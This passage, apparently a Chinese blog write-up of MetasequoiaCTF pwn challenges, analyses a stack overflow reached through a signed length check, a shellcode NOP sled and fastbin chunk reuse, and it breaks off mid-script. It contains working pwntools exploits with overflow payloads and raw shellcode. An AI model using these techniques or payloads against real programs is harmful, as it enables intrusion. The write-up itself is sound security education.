<p>比赛截图<br><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200221205756.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="fb" class="fancybox"><img alt="fb" title="fb" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200221205756.png" src="/img/loading.gif" class="lazyload"></a><br><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/pic/solved2.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="solved2.png" class="fancybox"><img alt="solved2.png" style="zoom:80%;" title="solved2.png" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/pic/solved2.png" src="/img/loading.gif" class="lazyload"></a></p>
<blockquote>
<p>比赛知名度不高，参赛人数不多，排名第一实属侥幸</p>
</blockquote>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>pwn题目总体来说难度不大，有两道堆入门级别的题目，正好拿来练手</p>
<h2 id="Blacksmith"><a href="#Blacksmith" class="headerlink" title="Blacksmith"></a>Blacksmith</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>世界需要你去拯救！不过在那之前，先让铁匠为你打造一把称手的兵器吧。<br>By <em>Mercurio</em></p>
</blockquote>
</li>
<li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/Blacksmith/blacksmith" target="_blank" rel="noopener">blacksmith</a></p>
</li>
<li><p>考察点：无符号整数</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>初始分值：100</p>
</li>
<li><p>最终分值：85</p>
</li>
<li><p>完成人数：5</p>
</li>
</ul>
<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>忘记密码的函数如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">forget</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  nbytes = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Forging..."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's the size of this sword's name?"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>;</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &gt; <span class="number">63</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"The name is too long!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"And the name is?"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Here you are, the new sword!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中<code>read</code>的第三个参数是无符号整数，而<code>nbytes</code>是有符号整数，所以输入负数可以绕过长度检查，然后读大量数据造成栈溢出，执行程序中的后门</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./blacksmith'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = <span class="number">0x0000000000400b23</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = <span class="number">72</span></span><br><span class="line">payload = <span class="string">'A'</span>*offset</span><br><span class="line">payload += p64(<span class="number">0x4007D6</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">'Your choice &gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">sla(<span class="string">' name?\n'</span>,<span class="string">'-1'</span>)</span><br><span class="line">ru(<span class="string">'And the name is?\n'</span>)</span><br><span class="line">debug()</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h2 id="Snow-Mountain"><a href="#Snow-Mountain" class="headerlink" title="Snow Mountain"></a>Snow Mountain</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>带<strong>雪橇</strong>了吗？一起<strong>滑雪</strong>！ </p>
<p>By <em>Mercurio</em>                            </p>
</blockquote>
</li>
<li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/SnowMountain/snow_mountain" target="_blank" rel="noopener">snow_mountain</a></p>
</li>
<li><p>考察点：shellcode、nop sled</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>初始分值：200</p>
</li>
<li><p>最终分值：184</p>
</li>
<li><p>完成人数：5</p>
</li>
</ul>
<p>分析程序：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *rnd_pos; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall *sc)(<span class="keyword">const</span> <span class="keyword">char</span> *, _QWORD); <span class="comment">// [rsp+8h] [rbp-1008h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed; <span class="comment">// [rsp+10h] [rbp-1000h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  srand(&amp;seed);</span><br><span class="line">  load_bg();</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"You know you have to conquer the mountain before you fight with the Demon Dragon. Luckily, you've prepared a sled for skiing.\n"</span>);</span><br><span class="line">  rnd_pos = sub_400841();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"You check the map again. You need to reach the lair of the Demon Dragon.\nCurrent position: %p\n\n"</span>, rnd_pos);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's your plan, hero?\n&gt; "</span>);</span><br><span class="line">  fgets(&amp;seed, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Where are you going to land?\n&gt; "</span>, <span class="number">4096L</span>L);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%p"</span>, &amp;sc);</span><br><span class="line">  sc(<span class="string">"%p"</span>, &amp;sc);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>程序末尾跳到指定位置执行shellcode，之前还给了一个栈的地址，但是读数据的时候加上了随机偏移，所以用足够多的nop填充在shellcode前面即可。</p>
<blockquote>
<p>后来看官方wp，原来这种操作叫做nop sled :D</p>
</blockquote>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./snow_mountain'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line">shellcode = <span class="string">'\xeb\x18\x5e\x48\x8d\x7e\x01\xc4\xe2\x7d\x78\x0e\xc5\xfe\x6f\x07\xc5\xfd\xef\xc1\xc5\xfe\x7f\x07\xeb\x06\xe8\xe3\xff\xff\xff\xaa\xe2\x9b\x6a\xfa\xe2\x23\x48\xe2\x14\x85\xc8\xc3\xc4\x85\x85\xd9\xc2\xfc\xe2\x23\x4d\xfa\xfd\xe2\x23\x4c\x1a\x91\xa5\xaf'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = <span class="number">0x00000000004009b3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Current position: '</span>)</span><br><span class="line">addr = eval(rc(<span class="number">14</span>))</span><br><span class="line">info_addr(<span class="string">'addr'</span>,addr)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'&gt; '</span>)</span><br><span class="line">payload = <span class="string">'\x90'</span>*<span class="number">1337</span>*<span class="number">2</span></span><br><span class="line">payload += shellcode</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'&gt; '</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(hex(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h2 id="Summoner"><a href="#Summoner" class="headerlink" title="Summoner"></a>Summoner</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>邪恶召唤师拦住了你的去路。这将是一场召唤师之间的对决。<br>By <em>Mercurio</em></p>
</blockquote>
</li>
<li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/Summoner/summoner" target="_blank" rel="noopener">summoner</a></p>
</li>
<li><p>考察点：fastbin回收机制</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>初始分值：250</p>
</li>
<li><p>最终分值：239</p>
</li>
<li><p>完成人数：3</p>
</li>
</ul>
<h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>功能：创建小怪、释放小怪、升级小怪、显示等级、派小怪打BOSS。</p>
<p>限制：只可以创建一个小怪，最高升到4级，只有5级小怪可以打败BOSS，给flag</p>
<p>分析一下，不难看出小怪结构体如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">imagin</span>&#123;</span></span><br><span class="line">	<span class="keyword">char</span> *name;</span><br><span class="line">	<span class="keyword">int</span>  level;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>summon</code>功能如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">"summon"</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s, <span class="string">"summon"</span>, <span class="number">6u</span>LL) )&#123;</span><br><span class="line">    <span class="keyword">if</span> ( imagin )&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Already have one creature. Release it first."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cmd = <span class="string">"\n"</span>;</span><br><span class="line">        nptr = strtok(&amp;v11, <span class="string">"\n"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( nptr )&#123;</span><br><span class="line">            imagin = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">            <span class="keyword">if</span> ( !imagin )&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"malloc() returned NULL. Out of Memory\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            *imagin = strdup(nptr);             <span class="comment">// call malloc</span></span><br><span class="line">            cmd = nptr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Current creature:\"%s\"\n"</span>, nptr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Invalid command"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>summon</code>的时候会先<code>malloc</code>一个<code>0x10</code>的chunk，随后的<code>strdup</code>也会调用<code>malloc</code>，chunk的大小取决于小怪名字的长度。</p>
<p><code>release</code>功能如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">"release"</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s, <span class="string">"release"</span>, <span class="number">7u</span>LL) )&#123;</span><br><span class="line">	<span class="keyword">if</span> ( imagin )&#123;</span><br><span class="line">		<span class="built_in">free</span>(*imagin);</span><br><span class="line">		imagin = <span class="number">0L</span>L;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Released."</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"No creature summoned."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>release</code>的时候释放了<code>strdup</code>分配的内存。</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目环境是<code>libc2.23</code>，没开<code>t-cache</code>机制，所以可以控制小怪的名字长度，分配一个<code>0x10</code>大小的chunk，然后释放掉它，这样就有了一个<code>0x10</code>的<code>fastbin</code>，再次<code>summon</code>小怪的时候，小怪结构体会被分配到<code>strdup</code>用过的chunk，chunk中的数据没有被清空，只要让<code>chunk+8=5</code>即可伪造等级</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./summoner'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': 